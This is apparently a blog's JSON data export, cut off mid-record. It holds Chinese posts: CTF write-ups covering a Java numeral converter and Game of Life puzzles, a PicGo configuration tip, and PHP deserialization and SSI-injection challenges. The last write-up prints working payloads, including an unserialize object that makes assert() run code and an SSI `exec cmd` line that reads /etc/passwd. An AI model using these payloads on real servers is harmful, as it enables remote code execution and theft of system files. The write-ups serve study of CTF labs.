一闪而过</strong>，我想到了应该能看程序的代码啥的找到，但是<del>天下武功，唯快不破</del>，下载 运行 截图一气呵成。</p>\n<p>​    <img src=\"https://s1.ax1x.com/2020/11/09/B7TOUA.png\"></p>\n<p>​    接下来让我康康哪一位是<del>瞎子</del>，包括答案里也是满满的嘲讽。</p>\n<p><strong>参考答案：flag{Are_you_eyes1ght_g00D?_can_you_dIst1nguish_1iI?}</strong></p>\n<h3 id=\"从零开始的记账工具人\"><a href=\"#从零开始的记账工具人\" class=\"headerlink\" title=\"从零开始的记账工具人\"></a>从零开始的记账工具人</h3><p>​    <del>npy</del>给了我一张账单，让我计算账单上面的金额，flag就是由金额组成的。本以为是一个简单的Excel的表格函数解决，打开我傻了。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2Flxf.png\"></p>\n<p>​    原来是搞这个大小写金额的转换，没见过Excel有这种操作就去百度，转了一大圈，网上只有数字转大写金额的，没有反过来的。还去了github上找代码，发现运行的结果和自己想要的还是有些出入。卡了有足足半天，之后自己写了一个Java代码跑了一遍，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Main</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Scanner sn = <span class=\"keyword\">new</span> Scanner(System.in);</span><br><span class=\"line\">        String str;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> x;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> cnt=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> result=<span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(cnt++!=<span class=\"number\">1000</span>)&#123;</span><br><span class=\"line\">            str = sn.next();</span><br><span class=\"line\">            x = sn.nextInt();</span><br><span class=\"line\">            result += tonum(str)*x;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">double</span> <span class=\"title\">tonum</span><span class=\"params\">(String s)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> len;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> res=<span class=\"number\">0</span>,temp = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">double</span> result=<span class=\"number\">0</span>;</span><br><span class=\"line\">        len = s.length();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">switch</span> (s.charAt(i))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;壹&#x27;</span>: temp=<span class=\"number\">1</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;贰&#x27;</span>: temp=<span class=\"number\">2</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;叁&#x27;</span>: temp=<span class=\"number\">3</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;肆&#x27;</span>: temp=<span class=\"number\">4</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;伍&#x27;</span>: temp=<span class=\"number\">5</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;陆&#x27;</span>: temp=<span class=\"number\">6</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;柒&#x27;</span>: temp=<span class=\"number\">7</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;捌&#x27;</span>: temp=<span class=\"number\">8</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;玖&#x27;</span>: temp=<span class=\"number\">9</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;零&#x27;</span>: <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;拾&#x27;</span>: res+=temp*<span class=\"number\">10</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;佰&#x27;</span>: res+=temp*<span class=\"number\">100</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;元&#x27;</span>: res+=temp;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;角&#x27;</span>: res+=temp*<span class=\"number\">0.1</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;分&#x27;</span>: res+=temp*<span class=\"number\">0.01</span>;temp=<span class=\"number\">0</span>;<span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;整&#x27;</span>: <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                    System.out.println(<span class=\"string\">&quot;这个认不出来&quot;</span> + s.charAt(i));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​    程序用的控制台输入，直接表格两列从头拉倒尾粘贴，出答案。程序的思路就是把金额大写当做字符串处理，每一位用<code>switch</code>判断数字或是个、十、百、千那一位上的数字。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2F7ee.png\"></p>\n<p>​    Java渣轻喷。</p>\n<p><strong>参考答案：flag{19115.33}</strong></p>\n<h3 id=\"超简单的世界模拟器\"><a href=\"#超简单的世界模拟器\" class=\"headerlink\" title=\"超简单的世界模拟器\"></a>超简单的世界模拟器</h3><p>​    这道题下面有两道小题</p>\n<h3 id=\"蝴蝶效应\"><a href=\"#蝴蝶效应\" class=\"headerlink\" title=\"蝴蝶效应\"></a>蝴蝶效应</h3><p>​    先看有意思的一个漫画</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2k9eg.png\"></p>\n<p>​    一个人用石头模拟了一整个宇宙，斯巴拉西。</p>\n<p>​    打开题目以后是一个终端，然提示等待你输入一个<strong>15*15矩阵</strong>（只能有0和1组成），看到这挺懵的，但是题目里有一个重要信息<strong>生命游戏</strong>，百度百科看了一下这个<a href=\"https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin\">生命游戏</a>，游戏的规则大致就是：<strong>一个细胞会根据周围的细胞数量判断存活和死亡</strong>，然后细胞会不断演算，这个和前面的漫画有异曲同工之妙。</p>\n<p>​    返回终端里面一片白中间有几个框框<img src=\"https://s1.ax1x.com/2020/11/05/B2ZFBT.png\">，题目中</p>\n<blockquote>\n<p>如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p>​    用细胞去碰框框就是了，正好也看到了一个知乎的提问：<a href=\"https://baike.baidu.com/item/%E7%94%9F%E5%91%BD%E6%B8%B8%E6%88%8F/2926434?fr=aladdin\"><em>生命游戏</em>(Game of Life)有哪些图形? - 知乎</a>，看了看内容更有趣了。</p>\n<p><img src=\"https://s1.ax1x.com/2020/11/05/B2elzn.png\"></p>\n<p>​    大师我悟了，就是提供一个初始的<strong>15*15矩阵</strong>，根据<strong>生命游戏</strong>的规则进行演算，然后去消除黑框框。我臭屁完了直接贴图形</p>\n<ul>\n<li>第一关</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000011000</span><br><span class=\"line\">000000000111100</span><br><span class=\"line\">000000000110110</span><br><span class=\"line\">000000000001100</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>​    第一关打上面的黑框，刚好在上面15行的范围内，用一个<strong>轻量级飞船</strong>直线打过去即可。</p>\n<ul>\n<li>第二关</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">000000000011000</span><br><span class=\"line\">000000000111100</span><br><span class=\"line\">000000000110110</span><br><span class=\"line\">000000000001100</span><br><span class=\"line\">000000000000000</span><br><span class=\"line\">001100000000000</span><br><span class=\"line\">011110000000000</span><br><span class=\"line\">011011000001100</span><br><span class=\"line\">000110000011110</span><br><span class=\"line\">000000000011011</span><br><span class=\"line\">000000000000110</span><br></pre></td></tr></table></figure>\n\n<p>​    第二关我期初试了试<strong>滑翔者</strong>放在右上角以便能打到最远距离，但是和第二个都是擦肩而过。于是我就乱试乱拼凑，最后拼出来一个<strong>三飞船</strong>，正好把两个黑框都给消了。</p>\n<p><strong>参考答案：</strong></p>\n<p><strong>1. flag{D0_Y0U_l1k3_g4me_0f_l1fe?_d5e1c80641}</strong></p>\n<p><strong>2. flag{1s_th3_e55ence_0f_0ur_un1ver5e_ju5t_c0mputat1on?_ea3e769cb8}</strong></p>\n<p>完工。</p>\n"},{"title":"PicGo复制自定义链接","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160027.jpg","date":"2020-11-30T01:54:11.000Z","_content":"\n\n# 前言\n\n现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：\n\n> **PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具**\n>\n> PicGo 本体支持如下图床：\n>\n> - `七牛图床` v1.0\n> - `腾讯云 COS v4\\v5 版本` v1.1 & v1.5.0\n> - `又拍云` v1.2.0\n> - `GitHub` v1.5.0\n> - `SM.MS V2` v2.3.0-beta.0\n> - `阿里云 OSS` v1.6.0\n> - `Imgur` v1.6.0\n>\n> **本体不再增加默认的图床支持。你可以自行开发第三方图床插件。**\n\n项目地址：[PicGo](https://github.com/Molunerfinn/PicGo)\n\n软件界面：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130095609.png)\n\n# 起因\n\nPicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含`$url`参数，也就是默认的url地址：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130093835.png)\n\n起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。\n\n# 解决方法\n\n在软件设置的配置文件里找到了`customLink`，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094455.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094651.png)\n\n# 结语\n\n软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了`$filename`变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是`png`格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接<kbd>Crtl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，把图片链接贴里面就彳亍了。<span class='heimu'>~~白嫖真爽~~</span>\n\n","source":"_posts/PicGo复制自定义链接.md","raw":"---\ntitle: PicGo复制自定义链接\ncategories:\n  - 捣腾博客\ntags:\n  - PicGo上传\n  - 图床\ncover: 'https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201116160027.jpg'\ndate: 2020-11-30 09:54:11\n---\n\n\n# 前言\n\n现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：\n\n> **PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具**\n>\n> PicGo 本体支持如下图床：\n>\n> - `七牛图床` v1.0\n> - `腾讯云 COS v4\\v5 版本` v1.1 & v1.5.0\n> - `又拍云` v1.2.0\n> - `GitHub` v1.5.0\n> - `SM.MS V2` v2.3.0-beta.0\n> - `阿里云 OSS` v1.6.0\n> - `Imgur` v1.6.0\n>\n> **本体不再增加默认的图床支持。你可以自行开发第三方图床插件。**\n\n项目地址：[PicGo](https://github.com/Molunerfinn/PicGo)\n\n软件界面：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130095609.png)\n\n# 起因\n\nPicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含`$url`参数，也就是默认的url地址：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130093835.png)\n\n起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。\n\n# 解决方法\n\n在软件设置的配置文件里找到了`customLink`，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094455.png)\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094651.png)\n\n# 结语\n\n软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了`$filename`变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是`png`格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接<kbd>Crtl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，把图片链接贴里面就彳亍了。<span class='heimu'>~~白嫖真爽~~</span>\n\n","slug":"PicGo复制自定义链接","published":1,"updated":"2021-12-30T09:42:54.195Z","_id":"ckrr3f9aq000dhotc8cfy89dk","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：</p>\n<blockquote>\n<p><strong>PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具</strong></p>\n<p>PicGo 本体支持如下图床：</p>\n<ul>\n<li><code>七牛图床</code> v1.0</li>\n<li><code>腾讯云 COS v4\\v5 版本</code> v1.1 &amp; v1.5.0</li>\n<li><code>又拍云</code> v1.2.0</li>\n<li><code>GitHub</code> v1.5.0</li>\n<li><code>SM.MS V2</code> v2.3.0-beta.0</li>\n<li><code>阿里云 OSS</code> v1.6.0</li>\n<li><code>Imgur</code> v1.6.0</li>\n</ul>\n<p><strong>本体不再增加默认的图床支持。你可以自行开发第三方图床插件。</strong></p>\n</blockquote>\n<p>项目地址：<a href=\"https://github.com/Molunerfinn/PicGo\">PicGo</a></p>\n<p>软件界面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130095609.png\"></p>\n<h1 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h1><p>PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含<code>$url</code>参数，也就是默认的url地址：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130093835.png\"></p>\n<p>起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。</p>\n<h1 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h1><p>在软件设置的配置文件里找到了<code>customLink</code>，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。<img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094455.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094651.png\"></p>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了<code>$filename</code>变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是<code>png</code>格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接<kbd>Crtl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，把图片链接贴里面就彳亍了。<span class='heimu'><del>白嫖真爽</del></span></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>现在博客里面的图片使用的是github+jsdelivr+PicGo图床。PicGo是一个开源的上传图片的软件，支持大部分图床的上传，只需要设置对应的图床参数即可一键上传。github上PicGo的概述：</p>\n<blockquote>\n<p><strong>PicGo: 一个用于快速上传图片并获取图片 URL 链接的工具</strong></p>\n<p>PicGo 本体支持如下图床：</p>\n<ul>\n<li><code>七牛图床</code> v1.0</li>\n<li><code>腾讯云 COS v4\\v5 版本</code> v1.1 &amp; v1.5.0</li>\n<li><code>又拍云</code> v1.2.0</li>\n<li><code>GitHub</code> v1.5.0</li>\n<li><code>SM.MS V2</code> v2.3.0-beta.0</li>\n<li><code>阿里云 OSS</code> v1.6.0</li>\n<li><code>Imgur</code> v1.6.0</li>\n</ul>\n<p><strong>本体不再增加默认的图床支持。你可以自行开发第三方图床插件。</strong></p>\n</blockquote>\n<p>项目地址：<a href=\"https://github.com/Molunerfinn/PicGo\">PicGo</a></p>\n<p>软件界面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130095609.png\"></p>\n<h1 id=\"起因\"><a href=\"#起因\" class=\"headerlink\" title=\"起因\"></a>起因</h1><p>PicGo上传成功以后可以自动复制url，但是默认复制的图片链接是github提供的，github在国内又经常抽风，图片通常都是无法访问的，所以我使用了jsdelivr提供的链接访问图片，PicGo也提供了自定义链接，但是规定必须包含<code>$url</code>参数，也就是默认的url地址：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130093835.png\"></p>\n<p>起初是把jsdelivr的链接直接拼在后面，每次使用的时候都再删一次。直到昨晚受不了了就尝试去修改软件试图绕过判断。</p>\n<h1 id=\"解决方法\"><a href=\"#解决方法\" class=\"headerlink\" title=\"解决方法\"></a>解决方法</h1><p>在软件设置的配置文件里找到了<code>customLink</code>，和之前自己设置的链接对照了一下，认为这个就是实际的自定义链接，直接在此处修改，再上传自动复制的链接就正确了，而且绕过了必须包含$url。<img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094455.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201130094651.png\"></p>\n<h1 id=\"结语\"><a href=\"#结语\" class=\"headerlink\" title=\"结语\"></a>结语</h1><p>软件提供了自动使用时间戳重命名，所以我自定义链接中还是使用了<code>$filename</code>变量，然后博客中的图片大部分都是使用QQ的截屏功能，出来的截图后缀都是<code>png</code>格式，这个可以根据需要自己设定拼接，然后使用的markdown编辑器是typora，想要添加图片直接<kbd>Crtl</kbd>+<kbd>Shift</kbd>+<kbd>i</kbd>，把图片链接贴里面就彳亍了。<span class='heimu'><del>白嫖真爽</del></span></p>\n"},{"title":"ReadlezPHP&EasySearch","date":"2021-04-20T09:12:43.000Z","cover":"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223513.jpg","_content":"\n# ReadlezPHP\n\n\n\n源码找到`time.php?source`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175641.png)\n\n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\n\n分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在`HelloPhp`中有一个`__destruct`方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如`$a($b)`格式进行函数调用，假如变量`a`为字符串`var_dump`，`b`是任意字符串，就相当于调用var_dump函数且参数为b。\n\n所以构造反序列化，调用assert函数执行phpinfo。如果向**assert()** 函数传递字符串，它将会被 **assert()** 当做 PHP 代码来执行)：\n\n```\n<?php\nclass HelloPhp\n{\n    public $a='phpinfo()';\n    public $b='assert';\n}\n\n$s=new HelloPhp();\necho serialize($s);\n\n```\n\nPOST请求\n\n```\ntime.php?data=O:8:\"HelloPhp\":2:{s:1:\"a\";s:9:\"phpinfo()\";s:1:\"b\";s:6:\"assert\";}\n```\n\n页面查找flag，在environment中找到flag\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175822.png)\n\n# EasySearch\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420171541.png)\n\n进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到`index.php.swp`文件：\n\n```php\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\n登陆功能又一个验证，需要传入的`passwd`参数使用**md5**加密以后是以**6d0bc1**开头的。简单写个脚本跑一下就有了：\n\n```python\n# codeing=utf-8\nimport hashlib\n\ncnt=1;\nwhile True:\n    md=hashlib.md5(str(cnt).encode(\"utf8\")).hexdigest()\n    if md.startswith(\"6d0bc1\"):\n        print(cnt)\n    cnt+=1\n#2020666\n#2305004\n```\n\n分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210417102904.png)\n\n看了看文件后缀是一格没有见过的：`shtml`，然后学到到了shtml有一种漏洞：[SSI注入漏洞](https://blog.csdn.net/qq_40657585/article/details/84260844)\n\n> SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n\n简单的命令执行\n\n```code\n\"-->'-->`--><<!--#exec cmd=\"cat /etc/passwd\"-->\n```\n\n我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为`flag_990c66bf85a09c664f0b6741840499b2`的文件，获得flag","source":"_posts/ReadlezPHP&EasySearch.md","raw":"---\ntitle: ReadlezPHP&EasySearch\ndate: 2021-04-20 17:12:43\ncategories: \n- CTF\ntags:\n- 反序列化\n- SSI注入\ncover: https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/cover/20201120223513.jpg\n---\n\n# ReadlezPHP\n\n\n\n源码找到`time.php?source`\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210420175641.png)\n\n```php\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n```\n\n分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在`HelloPhp`中有一个`__destruct`方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如`$a($b)`格式进行函数调用，假如变量`a`为字符串`var_dump`，`b`是任意字符串，就相当于调用var_dump函数且参数为b。\n\n所以构造反序列化，调用assert函数执行phpinfo。如果向**assert()** 函数传递字符串，它将会被 **assert()** 当做 PHP 代码来执行)：\n\n```\n<?php\nclass HelloPhp\n{\n    public $a='phpinfo()';\n    public $b='assert';\n}\n\n$s=new HelloPhp();\necho 